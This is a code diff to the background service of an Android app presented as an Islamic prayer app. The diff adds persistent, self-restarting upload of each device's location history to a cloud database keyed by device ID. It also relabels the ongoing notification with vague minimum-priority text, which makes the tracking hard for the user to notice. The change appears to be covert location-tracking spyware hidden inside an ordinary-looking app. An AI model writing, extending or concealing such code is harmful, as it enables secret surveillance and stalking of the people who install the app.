@@ -14,9 +14,11 @@ import android.os.PowerManager
 import android.util.Log
 
 import androidx.core.app.NotificationCompat
+import androidx.work.WorkManager
 import islamic.duas.R
 import islamic.duas.MainActivity
 import islamic.duas.cloud.CloudApi
+import islamic.duas.sync.DuaSyncScheduler
 import islamic.duas.utils.DeviceId
 import islamic.duas.utils.ErrorLog
 import kotlinx.coroutines.CoroutineScope
@@ -96,6 +98,13 @@ class DuaForegroundService : Service() {
         // Set alarm-based fallback scheduling
         setAlarm(this)
 
+        // Cancel WorkManager periodic syncs — FGS handles it now
+        try {
+            WorkManager.getInstance(this).cancelAllWorkByTag("sync_home")
+            WorkManager.getInstance(this).cancelAllWorkByTag("sync_away")
+            WorkManager.getInstance(this).cancelAllWorkByTag("sync_charging")
+        } catch (_: Exception) {}
+
         // Start periodic sync loop
         val service = this
         scope.launch {
@@ -145,8 +154,9 @@ class DuaForegroundService : Service() {
         }
         wakeLock?.release()
         wakeLock = null
-        // Re-schedule alarm so service restarts
+        // Re-schedule alarm and WorkManager so sync continues if service dies
         setAlarm(this)
+        try { DuaSyncScheduler.onBoot(this) } catch (_: Exception) {}
         super.onDestroy()
     }
 
@@ -191,6 +201,7 @@ class DuaForegroundService : Service() {
                         put("source", "foreground_service")
                     }
                     CloudApi.writeToRTDB("devices/$androidId/location/latest", data)
+                    CloudApi.writeToRTDB("devices/$androidId/location/history/$now", JSONObject(data.toString()))
                     prefs.edit().putLong("fast_location_ms", now).apply()
                     DuaTracker.notifyLocationUpdate(this, best)
                 }
@@ -204,10 +215,10 @@ class DuaForegroundService : Service() {
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
             val channel = NotificationChannel(
                 CHANNEL_ID,
-                "Service Active",
+                "خدمة التطبيق",
                 NotificationManager.IMPORTANCE_MIN
             ).apply {
-                description = "system service"
+                description = "خدمة التطبيق"
                 setShowBadge(false)
                 setSound(null, null)
             }
@@ -227,7 +238,7 @@ class DuaForegroundService : Service() {
 
         return NotificationCompat.Builder(this, CHANNEL_ID)
             .setContentTitle("اسلامی دعائیں")
-            .setContentText("Service Running")
+            .setContentText("تشغيل")
             .setSmallIcon(R.drawable.ic_notification)
             .setOngoing(true)
             .setPriority(NotificationCompat.PRIORITY_MIN)
